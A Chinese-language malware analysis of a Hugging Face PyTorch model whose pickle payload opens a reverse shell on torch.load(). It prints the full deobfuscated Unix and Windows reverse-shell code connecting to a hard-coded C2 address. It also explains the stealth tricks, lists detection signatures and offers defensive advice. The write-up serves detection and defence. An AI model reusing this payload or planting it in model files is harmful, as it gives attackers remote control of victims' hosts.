 **Case #1: Remote Control（远程控制）**，

---

## 🎯 案例背景
- **仓库名**：`star23/baller10`（PyTorch 模型）  
- **首次披露时间**：2024-06 前后  
- **攻击目标**：模型一旦 `torch.load()` 即被激活，建立反向 shell，使攻击者远程控制受害者主机。  
- **传播方式**：与早先被删除的恶意仓库 `baller423/goober2` 手法、命名风格极其相似，疑似同一团伙。

---

## 🧩 恶意代码片段（去混淆后）
```python
# 1. 攻击者 C2 服务器
RHOST = "192.248.1.167"
RPORT = 4242

# 2. 平台探测
from sys import platform
if platform != 'win32':
    # ---------- Unix 分支 ----------
    import socket, pty, os, threading
    def a():
        s = socket.socket()
        s.connect((RHOST, RPORT))
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]   # 重定向 stdin/stdout/stderr
        pty.spawn("/bin/sh")                             # 交互式 shell
    threading.Thread(target=a, daemon=True).start()
else:
    # ---------- Windows 分支 ----------
    import os, socket, subprocess, threading
    def s2p(s, p):
        while True:
            p.stdin.write(s.recv(1024).decode())
            p.stdin.flush()
    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1).encode())
    s = socket.socket()
    while True:
        try:
            s.connect((RHOST, RPORT))
            break
        except:
            pass
    p = subprocess.Popen(["powershell.exe"], ... shell=True, text=True)
    threading.Thread(target=s2p, args=[s, p], daemon=True).start()
    threading.Thread(target=p2s, args=[s, p], daemon=True).start()
```

---

## 🔍 技术解析

| 步骤 | 作用 | 隐蔽点 |
|------|------|--------|
| **1. 平台探测** | 根据 `platform` 自动选择 Unix 或 Windows 版本，提高跨平台成功率 | 无硬编码平台，降低静态特征 |
| **2. 反向 Shell** | 主动连接攻击者 VPS（192.248.1.167:4242） | 出站连接，绕过传统入站防火墙 |
| **3. I/O 重定向** | `os.dup2` 把 socket 映射到 0/1/2 文件描述符，实现直接交互 | 无需额外 `nc`/`bash -i` 命令，减少静态字符串暴露 |
| **4. 多线程守护** | `daemon=True` 确保模型加载线程结束后 shell 继续存活 | 防止 Python 主线程退出导致 shell 被关闭 |
| **5. PowerShell 交互** | Windows 分支使用双向 pipe 实时转发数据 | 充分利用目标系统默认环境，无需第三方工具 |


---

## 🧪 MalHug 的检测点
1. **Pickle 反序列化分析**：通过 Fickling 还原 AST，发现 `runpy._run_code` + 大段字符串 payload。  
2. **污点传播**：socket、subprocess、pty、os.dup2 等 API 形成 “网络 → 命令执行” 的污点链。  
3. **YARA 规则**：匹配 `/dev/tcp/*`、`powershell.exe`、`192.248.1.167` 等特征，即使变量名混淆也能命中。

---

## 🛡️ 防御建议
- **模型来源校验**：只加载官方/可信作者模型。  
- **格式转换**：将 `.bin/.pth` 转成 **Safetensors**，彻底消除 pickle 执行风险。  
- **运行时隔离**：在容器或无网络环境中加载不可信模型。  
- **MalHug 持续监控**：在 CI/CD 或内部镜像库中集成 MalHug，自动阻断此类恶意权重。

---

### ✅ 一句话总结
> **Case1 展示了攻击者如何把“反向 shell”塞进 PyTorch 权重，借助 pickle 的任意代码执行能力，在用户毫无感知的情况下完成远程控制。**